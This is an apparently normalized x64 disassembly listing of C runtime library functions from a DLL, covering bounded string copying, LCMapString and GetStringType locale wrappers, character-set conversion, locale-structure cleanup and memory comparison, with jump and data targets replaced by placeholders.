xor eax eax
add rsp 0x38
retn
mov [ r9 ] dl
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x22
mov [ rsp + 0x20 ] 0x0
call sub_180008d20
mov eax 0x22
add rsp 0x38
retn
sub_1800101b0
sub rsp 0x38
test r9 r9
mov r11 rdx
mov r10 rcx
jne r-xdata
test rcx rcx
je r-xdata
test rcx rcx
jne r-xdata
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x16
call sub_180008d20
mov eax 0x16
add rsp 0x38
retn
test rdx rdx
je r-xdata
test rdx rdx
jne r-xdata
test r9 r9
jne r-xdata
xor eax eax
add rsp 0x38
retn
test r8 r8
jne r-xdata
mov [ rcx ] r9b
xor eax eax
add rsp 0x38
retn
cmp r9 0xffffffffffffffff
mov rdx rcx
mov rcx r11
jne r-xdata
mov [ rcx ] r8b
movzx eax [ r8 ]
add rdx 0x1
add r8 0x1
test al al
mov [ rdx - 0x1 ] al
je r-xdata
nop
nop
test r9 r9
jne r-xdata
sub rcx 0x1
je r-xdata
test rcx rcx
jne r-xdata
sub rcx 0x1
jne r-xdata
mov [ rdx ] r9b
sub r9 0x1
jne r-xdata
cmp r9 0xffffffffffffffff
jne r-xdata
movzx eax [ r8 ]
add rdx 0x1
add r8 0x1
test al al
mov [ rdx - 0x1 ] al
je r-xdata
jmp r-xdata
mov [ r10 ] 0x0
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x22
mov [ rsp + 0x20 ] 0x0
call sub_180008d20
mov eax 0x22
add rsp 0x38
retn
mov [ r10 + r11 - 0x1 ] cl
lea eax [ rcx + 0x50 ]
add rsp 0x38
retn
sub_1800102d0
sub rsp 0x38
test ecx ecx
js r-xdata
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x16
call sub_180008d20
or eax 0xffffffff
add rsp 0x38
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
add rsp 0x38
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
add rsp 0x38
retn
sub_180010330
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x60
lea rbp [ rsp + 0x40 ]
mov [ rbp + 0x50 ] rbx
mov [ rbp + 0x58 ] rsi
mov [ rbp + 0x60 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x18 ] rax
mov r10d [ rw-data ]
xor ebx ebx
mov r14 r9
test r10d r10d
mov [ rbp + 0x8 ] r9
mov [ rbp ] r8d
mov r15d edx
mov [ rbp + 0x10 ] edx
mov rdi rcx
jne r-xdata
mov r9d [ rbp + 0x70 ]
test r9d r9d
jle r-xdata
lea r9d [ rbx + 0x1 ]
lea r8 [ r--data ]
mov edx 0x100
xor ecx ecx
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
cmp r10d 0x2
je r-xdata
mov eax r9d
mov rcx r14
nop
nop
call [ GetLastError@IAT ]
mov r10d [ rw-data ]
mov ecx 0x2
cmp eax 0x78
cmove r10d ecx
lea r10d [ rbx + 0x1 ]
jmp r-xdata
test r15d r15d
mov r12 rbx
jne r-xdata
test r10d r10d
je r-xdata
mov ecx r9d
sub ecx eax
sub ecx 0x1
cmp ecx r9d
jge r-xdata
add rcx 0x1
test eax eax
jne r-xdata
mov [ rw-data ] r10d
mov esi [ rbp + 0x88 ]
test esi esi
jne r-xdata
mov rax [ rdi ]
mov r15d [ rax + 0x14 ]
mov [ rbp + 0x10 ] r15d
cmp r10d 0x1
jne r-xdata
mov r9d ecx
mov [ rbp + 0x70 ] ecx
lea r9d [ rcx + 0x1 ]
mov [ rbp + 0x70 ] r9d
jmp r-xdata
sub eax 0x1
cmp [ rcx ] bl
je r-xdata
or eax 0xffffffff
mov ecx r15d
call sub_1800125d0
cmp eax 0xffffffff
mov r13d eax
jne r-xdata
mov rax [ rdi ]
mov esi [ rax + 0x4 ]
xor eax eax
jmp r-xdata
mov r13d [ rbp + 0x88 ]
mov r12d ebx
test r13d r13d
jne r-xdata
cmp eax esi
mov r8 r14
je r-xdata
mov rcx [ rbp + 0x18 ]
xor rcx rbp
call sub_180006970
mov rbx [ rbp + 0x50 ]
mov rsi [ rbp + 0x58 ]
mov rdi [ rbp + 0x60 ]
lea rsp [ rbp + 0x20 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
cmp [ rbp + 0x90 ] ebx
mov edx 0x1
mov eax 0x9
mov r8 r14
mov ecx r13d
cmovne edx eax
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
test eax eax
movsxd r14 eax
je r-xdata
mov rax [ rdi ]
mov r13d [ rax + 0x4 ]
mov eax [ rbp + 0x80 ]
mov r9d [ rbp + 0x70 ]
mov edx [ rbp ]
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x78 ]
mov ecx r15d
mov [ rsp + 0x20 ] rax
call [ LCMapStringA@IAT ]
mov ebx eax
lea r9 [ rbp + 0x70 ]
mov edx eax
mov ecx esi
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call sub_180012640
test rax rax
mov r14 rax
je r-xdata
jle r-xdata
mov r9d [ rbp + 0x70 ]
mov edx [ rbp ]
mov r8 rax
mov ecx r15d
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call [ LCMapStringA@IAT ]
mov r15 [ rbp + 0x78 ]
test eax eax
movsxd r9 eax
mov [ rbp + 0x8 ] r9d
jle r-xdata
xor edx edx
mov rax 0xffffffffffffffe0
div r14
cmp rax 0x2
jb r-xdata
mov rcx r14
call sub_1800085f0
test r12 r12
je r-xdata
cmp r9 0xffffffffffffffe0
mov rcx r9
ja r-xdata
lea rcx [ r14 + r14 + 0x10 ]
mov rdi 0xffffffffffffff0
cmp rcx 0x400
ja r-xdata
mov eax ebx
cmp r15 r12
je r-xdata
add rcx 0x10
cmp rcx 0x400
ja r-xdata
call sub_180007310
test rax rax
mov rsi rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov rcx r12
call sub_1800085f0
jmp r-xdata
call sub_180007310
test rax rax
mov rdi rax
je r-xdata
lea rdi [ rcx + 0xf ]
cmp rdi rcx
ja r-xdata
test rsi rsi
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180013210
sub rsp rax
lea rsi [ rsp + 0x40 ]
test rsi rsi
je r-xdata
mov rax rdi
test rdi rdi
mov r9d [ rbp + 0x8 ]
je r-xdata
mov [ rax ] 0xdddd
and rdi 0xfffffffffffffff0
mov rax rdi
call sub_180013210
sub rsp rdi
lea rdi [ rsp + 0x40 ]
test rdi rdi
je r-xdata
mov rdi 0xffffffffffffff0
mov r9d [ rbp + 0x70 ]
mov r8 [ rbp + 0x8 ]
mov edx 0x1
mov ecx r13d
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] rsi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov [ rsi ] 0xcccc
jmp r-xdata
movsxd r8 r9d
xor edx edx
mov rcx rdi
call sub_1800059c0
mov r11d [ rbp + 0x8 ]
mov r9d [ rbp + 0x70 ]
mov edx [ rbp ]
mov ecx [ rbp + 0x10 ]
mov [ rsp + 0x28 ] r11d
mov r8 r14
mov [ rsp + 0x20 ] rdi
call [ LCMapStringA@IAT ]
test eax eax
mov [ rbp + 0x8 ] eax
je r-xdata
mov [ rdi ] 0xcccc
jmp r-xdata
cmp [ rsi - 0x10 ] 0xdddd
lea rcx [ rsi - 0x10 ]
jne r-xdata
mov edx [ rbp ]
mov r9d r14d
mov r8 rsi
mov ecx r15d
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call [ LCMapStringW@IAT ]
test eax eax
movsxd r12 eax
je r-xdata
add rsi 0x10
cmp [ rdi - 0x10 ] 0xdddd
lea rcx [ rdi - 0x10 ]
jne r-xdata
mov eax [ rbp + 0x80 ]
lea r9 [ rbp + 0x8 ]
mov r8 rdi
mov [ rsp + 0x28 ] eax
mov edx esi
mov ecx r13d
mov [ rsp + 0x20 ] r15
call sub_180012640
mov ecx [ rbp + 0x8 ]
test rax rax
mov r12 rax
cmove ecx ebx
mov ebx ecx
add rdi 0x10
mov eax r12d
jmp r-xdata
call sub_1800085f0
mov ecx [ rbp ]
bt ecx 0xa
jae r-xdata
call sub_1800085f0
test eax eax
jle r-xdata
mov eax [ rbp + 0x80 ]
test eax eax
je r-xdata
xor edx edx
mov rax 0xffffffffffffffe0
div r12
cmp rax 0x2
jb r-xdata
cmp r12d eax
jg r-xdata
lea rcx [ r12 + r12 + 0x10 ]
cmp rcx 0x400
ja r-xdata
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x78 ]
mov edx ecx
mov r9d r14d
mov r8 rsi
mov ecx r15d
mov [ rsp + 0x20 ] rax
call [ LCMapStringW@IAT ]
jmp r-xdata
call sub_180007310
test rax rax
mov rdi rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
test rdi rdi
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180013210
sub rsp rax
lea rdi [ rsp + 0x40 ]
test rdi rdi
je r-xdata
mov rax rdi
mov edx [ rbp ]
mov r9d r14d
mov r8 rsi
mov ecx r15d
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rdi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov [ rdi ] 0xcccc
jmp r-xdata
cmp [ rdi - 0x10 ] 0xdddd
lea rcx [ rdi - 0x10 ]
jne r-xdata
mov eax [ rbp + 0x80 ]
xor edx edx
mov [ rsp + 0x38 ] rbx
test eax eax
mov r9d r12d
mov r8 rdi
mov ecx r13d
mov [ rsp + 0x30 ] rbx
jne r-xdata
add rdi 0x10
call sub_1800085f0
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x78 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
jmp r-xdata
call [ WideCharToMultiByte@IAT ]
mov r12d eax
sub_180010870
mov rax rsp
push rbx
sub rsp 0x80
mov [ rax + 0x8 ] rbp
mov [ rax + 0x18 ] rdi
xor dil dil
test rcx rcx
mov [ rax - 0x10 ] r12
mov [ rax - 0x18 ] r13
mov [ rax - 0x20 ] dil
mov rbp r9
mov r12d r8d
mov r13d edx
jne r-xdata
mov rax [ rcx ]
lea rdx [ rsp + 0x50 ]
mov [ rdx ] rax
mov rax [ rcx + 0x8 ]
mov [ rdx + 0x8 ] rax
movzx edi [ rsp + 0x68 ]
mov rbx [ rsp + 0x60 ]
mov [ rax + 0x10 ] rsi
call sub_18000a690
mov rcx [ rax + 0xc0 ]
mov rsi [ rax + 0xb8 ]
mov rbx rax
cmp rcx [ rw-data ]
mov [ rsp + 0x60 ] rax
mov [ rsp + 0x50 ] rcx
mov [ rsp + 0x58 ] rsi
je r-xdata
add rsp 0x80
pop rbx
retn
and [ rbx + 0xc8 ] 0xfffffffd
cmp rsi [ rw-data ]
mov rsi [ rsp + 0x98 ]
je r-xdata
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
test [ rbx + 0xc8 ] 0x2
jne r-xdata
mov eax [ rbx + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_18000d880
mov [ rsp + 0x50 ] rax
mov eax [ rsp + 0xd0 ]
lea rcx [ rsp + 0x50 ]
mov r9 rbp
mov [ rsp + 0x40 ] eax
mov eax [ rsp + 0xc8 ]
mov r8d r12d
mov [ rsp + 0x38 ] eax
mov eax [ rsp + 0xc0 ]
mov edx r13d
mov [ rsp + 0x30 ] eax
mov rax [ rsp + 0xb8 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0xb0 ]
mov [ rsp + 0x20 ] eax
call sub_180010330
mov r13 [ rsp + 0x70 ]
mov r12 [ rsp + 0x78 ]
mov rbp [ rsp + 0x90 ]
test dil dil
mov rdi [ rsp + 0xa0 ]
je r-xdata
or [ rbx + 0xc8 ] 0x2
mov dil 0x1
mov [ rsp + 0x68 ] dil
jmp r-xdata
call sub_18000cd30
mov [ rsp + 0x58 ] rax
sub_1800109d0
mov [ rsp + 0x20 ] r9d
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x40
lea rbp [ rsp + 0x30 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x8 ] rax
mov eax [ rw-data ]
mov r14 r8
mov r15d edx
test eax eax
mov r12 rcx
jne r-xdata
cmp eax 0x2
je r-xdata
mov r8d 0x1
lea r9 [ rbp ]
lea rdx [ r--data ]
mov ecx r8d
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
mov esi [ rbp + 0x70 ]
xor edi edi
test esi esi
jne r-xdata
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov ebx [ rbp + 0x68 ]
test ebx ebx
jne r-xdata
mov rax [ r12 ]
mov esi [ rax + 0x14 ]
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x2
mov esi [ rbp + 0x68 ]
xor edi edi
test esi esi
jne r-xdata
mov ecx esi
call sub_1800125d0
cmp eax 0xffffffff
jne r-xdata
mov rax [ r12 ]
mov ebx [ rax + 0x4 ]
xor eax eax
jmp r-xdata
cmp [ rbp + 0x78 ] edi
mov r9d [ rbp + 0x58 ]
mov edx 0x1
mov eax 0x9
mov r8 r14
mov ecx esi
cmovne edx eax
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
test eax eax
movsxd r12 eax
je r-xdata
mov rax [ r12 ]
mov esi [ rax + 0x4 ]
cmp eax ebx
je r-xdata
mov rcx [ rbp + 0x8 ]
xor rcx rbp
call sub_180006970
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
jle r-xdata
mov rax [ rbp + 0x60 ]
mov r9d [ rbp + 0x58 ]
mov r8 r14
mov edx r15d
mov ecx esi
mov [ rsp + 0x20 ] rax
call [ GetStringTypeA@IAT ]
test rdi rdi
mov ebx eax
je r-xdata
lea r9 [ rbp + 0x58 ]
mov r8 r14
mov edx eax
mov ecx ebx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
call sub_180012640
test rax rax
mov rdi rax
je r-xdata
mov rax 0x7ffffffffffffff0
cmp r12 rax
ja r-xdata
mov eax ebx
mov rcx rdi
call sub_1800085f0
mov r14 rax
lea rcx [ r12 + r12 + 0x10 ]
cmp rcx 0x400
ja r-xdata
call sub_180007310
test rax rax
mov rbx rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180013210
sub rsp rax
lea rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
lea r8 [ r12 + r12 ]
xor edx edx
mov rcx rbx
call sub_1800059c0
mov r9d [ rbp + 0x58 ]
mov r8 r14
mov edx 0x1
mov ecx esi
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov [ rbx ] 0xcccc
jmp r-xdata
cmp [ rbx - 0x10 ] 0xdddd
lea rcx [ rbx - 0x10 ]
jne r-xdata
mov r9 [ rbp + 0x60 ]
mov r8d eax
mov rdx rbx
mov ecx r15d
call [ GetStringTypeW@IAT ]
mov edi eax
add rbx 0x10
mov eax edi
jmp r-xdata
call sub_1800085f0
sub_180010c30
mov rax rsp
push rbx
sub rsp 0x70
mov [ rax + 0x8 ] rbp
mov [ rax + 0x18 ] rdi
xor dil dil
test rcx rcx
mov [ rax - 0x10 ] r12
mov [ rax - 0x18 ] r13
mov [ rax - 0x20 ] dil
mov ebp r9d
mov r12 r8
mov r13d edx
jne r-xdata
mov rax [ rcx ]
lea rdx [ rsp + 0x40 ]
mov [ rdx ] rax
mov rax [ rcx + 0x8 ]
mov [ rdx + 0x8 ] rax
movzx edi [ rsp + 0x58 ]
mov rbx [ rsp + 0x50 ]
mov [ rax + 0x10 ] rsi
call sub_18000a690
mov rcx [ rax + 0xc0 ]
mov rsi [ rax + 0xb8 ]
mov rbx rax
cmp rcx [ rw-data ]
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rsi
je r-xdata
add rsp 0x70
pop rbx
retn
and [ rbx + 0xc8 ] 0xfffffffd
cmp rsi [ rw-data ]
mov rsi [ rsp + 0x88 ]
je r-xdata
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
test [ rbx + 0xc8 ] 0x2
jne r-xdata
mov eax [ rbx + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_18000d880
mov [ rsp + 0x40 ] rax
mov eax [ rsp + 0xb8 ]
lea rcx [ rsp + 0x40 ]
mov r9d ebp
mov [ rsp + 0x38 ] eax
mov eax [ rsp + 0xb0 ]
mov r8 r12
mov [ rsp + 0x30 ] eax
mov eax [ rsp + 0xa8 ]
mov edx r13d
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0xa0 ]
mov [ rsp + 0x20 ] rax
call sub_1800109d0
mov r13 [ rsp + 0x60 ]
mov r12 [ rsp + 0x68 ]
mov rbp [ rsp + 0x80 ]
test dil dil
mov rdi [ rsp + 0x90 ]
je r-xdata
or [ rbx + 0xc8 ] 0x2
mov dil 0x1
mov [ rsp + 0x58 ] dil
jmp r-xdata
call sub_18000cd30
mov [ rsp + 0x48 ] rax
sub_180010d80
test rcx rcx
je r-xdata
retn 0x0
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x8 ]
call sub_1800085f0
mov rcx [ rbx + 0x10 ]
call sub_1800085f0
mov rcx [ rbx + 0x18 ]
call sub_1800085f0
mov rcx [ rbx + 0x20 ]
call sub_1800085f0
mov rcx [ rbx + 0x28 ]
call sub_1800085f0
mov rcx [ rbx + 0x30 ]
call sub_1800085f0
mov rcx [ rbx ]
call sub_1800085f0
mov rcx [ rbx + 0x40 ]
call sub_1800085f0
mov rcx [ rbx + 0x48 ]
call sub_1800085f0
mov rcx [ rbx + 0x50 ]
call sub_1800085f0
mov rcx [ rbx + 0x58 ]
call sub_1800085f0
mov rcx [ rbx + 0x60 ]
call sub_1800085f0
mov rcx [ rbx + 0x68 ]
call sub_1800085f0
mov rcx [ rbx + 0x38 ]
call sub_1800085f0
mov rcx [ rbx + 0x70 ]
call sub_1800085f0
mov rcx [ rbx + 0x78 ]
call sub_1800085f0
mov rcx [ rbx + 0x80 ]
call sub_1800085f0
mov rcx [ rbx + 0x88 ]
call sub_1800085f0
mov rcx [ rbx + 0x90 ]
call sub_1800085f0
mov rcx [ rbx + 0x98 ]
call sub_1800085f0
mov rcx [ rbx + 0xa0 ]
call sub_1800085f0
mov rcx [ rbx + 0xa8 ]
call sub_1800085f0
mov rcx [ rbx + 0xb0 ]
call sub_1800085f0
mov rcx [ rbx + 0xb8 ]
call sub_1800085f0
mov rcx [ rbx + 0xc0 ]
call sub_1800085f0
mov rcx [ rbx + 0xc8 ]
call sub_1800085f0
mov rcx [ rbx + 0xd0 ]
call sub_1800085f0
mov rcx [ rbx + 0xd8 ]
call sub_1800085f0
mov rcx [ rbx + 0xe0 ]
call sub_1800085f0
mov rcx [ rbx + 0xe8 ]
call sub_1800085f0
mov rcx [ rbx + 0xf0 ]
call sub_1800085f0
mov rcx [ rbx + 0xf8 ]
call sub_1800085f0
mov rcx [ rbx + 0x100 ]
call sub_1800085f0
mov rcx [ rbx + 0x108 ]
call sub_1800085f0
mov rcx [ rbx + 0x110 ]
call sub_1800085f0
mov rcx [ rbx + 0x118 ]
call sub_1800085f0
mov rcx [ rbx + 0x120 ]
call sub_1800085f0
mov rcx [ rbx + 0x128 ]
call sub_1800085f0
mov rcx [ rbx + 0x130 ]
call sub_1800085f0
mov rcx [ rbx + 0x138 ]
call sub_1800085f0
mov rcx [ rbx + 0x140 ]
call sub_1800085f0
mov rcx [ rbx + 0x148 ]
call sub_1800085f0
mov rcx [ rbx + 0x150 ]
call sub_1800085f0
add rsp 0x20
pop rbx
sub_180010f70
test rcx rcx
je r-xdata
retn 0x0
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x8 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800085f0
mov rcx [ rbx + 0x10 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800085f0
add rsp 0x20
pop rbx
call sub_1800085f0
sub_180010fc0
test rcx rcx
je r-xdata
retn 0x0
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x18 ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x20 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800085f0
mov rcx [ rbx + 0x28 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800085f0
mov rcx [ rbx + 0x30 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800085f0
mov rcx [ rbx + 0x38 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800085f0
mov rcx [ rbx + 0x40 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800085f0
mov rcx [ rbx + 0x48 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1800085f0
add rsp 0x20
pop rbx
call sub_1800085f0
sub_180011070
sub rdx rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
test cl 0x7
je r-xdata
xor rax rax
retn
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov r9 r8
shr r9 0x3
jne r-xdata
nop
sbb eax eax
sbb eax 0xffffffff
retn
inc rcx
dec r8
jne r-xdata
shr r9 0x2
je r-xdata
inc rcx
dec r8
test cl 0x7
jne r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov rcx [ rcx + rdx ]
bswap rax
bswap rcx
cmp rax rcx
sbb eax eax
sbb eax 0xffffffff
retn
mov rax [ rcx + 0x8 ]
cmp rax [ rdx + rcx + 0x8 ]
jne r-xdata
add rcx 0x8
dec r9
jne r-xdata
add rcx 0x8
mov rax [ rcx + 0x10 ]
cmp rax [ rdx + rcx + 0x10 ]
jne r-xdata
and r8 0x7
jmp r-xdata
add rcx 0x8
mov rax [ rcx + 0x18 ]
cmp rax [ rdx + rcx + 0x18 ]
jne r-xdata
add rcx 0x8
add rcx 0x20
dec r9
jne r-xdata
and r8 0x1f
sub_180011150
test r8 r8
je r-xdata
xor rax rax
retn
sub rdx rcx
mov r9 rdx
mov r11 0x8101010101010100
test cl 0x7
je r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
mov al [ rcx ]
mov dl [ rcx + r9 ]
inc rcx
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
dec r8
je r-xdata
add rcx 0x8
sub r8 0x8
mov r10 0x7efefefefefefeff
jbe r-xdata
test al al
je r-xdata
xor rax 0xffffffffffffffff
add r10 rdx
xor rax r10
test r11 rax
je r-xdata
test rcx 0x7
jne r-xdata
jmp r-xdata
test dl dl
je r-xdata
xor rax rax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_180011210
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x60
lea rbp [ rsp + 0x40 ]
mov [ rbp + 0x50 ] rbx
mov [ rbp + 0x58 ] rsi
mov [ rbp + 0x60 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x10 ] rax
mov r10d [ rw-data ]
xor r13d r13d
mov r12 r9
test r10d r10d
mov [ rbp + 0x8 ] r9
mov r11d r8d
mov [ rbp ] r8d
mov r15d edx
mov rdi rcx
jne r-xdata
mov ebx [ rbp + 0x70 ]
test ebx ebx
jle r-xdata
lea r9d [ r13 + 0x1 ]
lea r8 [ r--data ]
mov edx 0x100
xor ecx ecx
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] r13
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
cmp r10d 0x1
jne r-xdata
mov eax ebx
mov rcx r12
nop
call [ GetLastError@IAT ]
mov r10d [ rw-data ]
mov ecx 0x2
cmp eax 0x78
cmove r10d ecx
lea r10d [ r13 + 0x1 ]
jmp r-xdata
cmp r10d 0x2
je r-xdata
mov eax [ rbp + 0x80 ]
mov r9d ebx
mov r8 r12
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x78 ]
mov edx r11d
mov ecx r15d
mov [ rsp + 0x20 ] rax
call [ LCMapStringW@IAT ]
jmp r-xdata
sub edx eax
add ebx edx
add rcx 0x2
test eax eax
jne r-xdata
mov r11d [ rbp ]
mov [ rw-data ] r10d
test r15d r15d
mov r14d r13d
jne r-xdata
test r10d r10d
jne r-xdata
mov rcx [ rbp + 0x10 ]
xor rcx rbp
call sub_180006970
mov rbx [ rbp + 0x50 ]
mov rsi [ rbp + 0x58 ]
mov rdi [ rbp + 0x60 ]
lea rsp [ rbp + 0x20 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
sub eax 0x1
or edx 0xffffffff
cmp [ rcx ] r13w
je r-xdata
mov eax edx
mov esi [ rbp + 0x88 ]
test esi esi
jne r-xdata
mov rax [ rdi ]
mov r15d [ rax + 0x14 ]
xor eax eax
mov ecx r15d
call sub_1800125d0
cmp esi eax
je r-xdata
mov rax [ rdi ]
mov esi [ rax + 0x4 ]
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x30 ] r13
mov r9d ebx
mov r8 r12
xor edx edx
mov ecx esi
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] r13
call [ WideCharToMultiByte@IAT ]
test eax eax
movsxd r13 eax
je r-xdata
cmp eax 0xffffffff
cmovne esi eax
jle r-xdata
xor edx edx
mov rax 0xffffffffffffffe0
mov rcx r13
div r13
cmp rax 0x1
jb r-xdata
add rcx 0x10
mov rdx 0xffffffffffffff0
cmp rcx 0x400
ja r-xdata
call sub_180007310
test rax rax
mov r12 rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
test r12 r12
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180013210
sub rsp rax
lea r12 [ rsp + 0x40 ]
test r12 r12
je r-xdata
mov rax rdx
mov r8 [ rbp + 0x8 ]
xor edi edi
mov r9d ebx
mov [ rsp + 0x38 ] rdi
mov [ rsp + 0x30 ] rdi
xor edx edx
mov ecx esi
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] r12
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ r12 ] 0xcccc
jmp r-xdata
cmp [ r12 - 0x10 ] 0xdddd
lea rcx [ r12 - 0x10 ]
jne r-xdata
mov edx [ rbp ]
mov r9d r13d
mov r8 r12
mov ecx r15d
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
call [ LCMapStringA@IAT ]
test eax eax
movsxd rdi eax
jle r-xdata
add r12 0x10
mov eax r14d
jmp r-xdata
call sub_1800085f0
xor edx edx
mov rax 0xffffffffffffffe0
mov rcx rdi
div rdi
cmp rax 0x1
jb r-xdata
add rcx 0x10
cmp rcx 0x400
ja r-xdata
call sub_180007310
test rax rax
mov rbx rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180013210
sub rsp rax
lea rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
mov r9d r13d
mov r13d [ rbp ]
mov r8 r12
mov ecx r15d
mov edx r13d
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rbx
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rbx ] 0xcccc
jmp r-xdata
cmp [ rbx - 0x10 ] 0xdddd
lea rcx [ rbx - 0x10 ]
jne r-xdata
bt r13d 0xa
jae r-xdata
add rbx 0x10
call sub_1800085f0
mov eax [ rbp + 0x80 ]
mov r9d edi
mov r8 rbx
test eax eax
mov edx 0x1
mov ecx esi
jne r-xdata
movsxd rax [ rbp + 0x80 ]
mov r14d edi
test eax eax
je r-xdata
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x78 ]
xor eax eax
mov [ rsp + 0x28 ] eax
jmp r-xdata
cmp eax edi
jg r-xdata
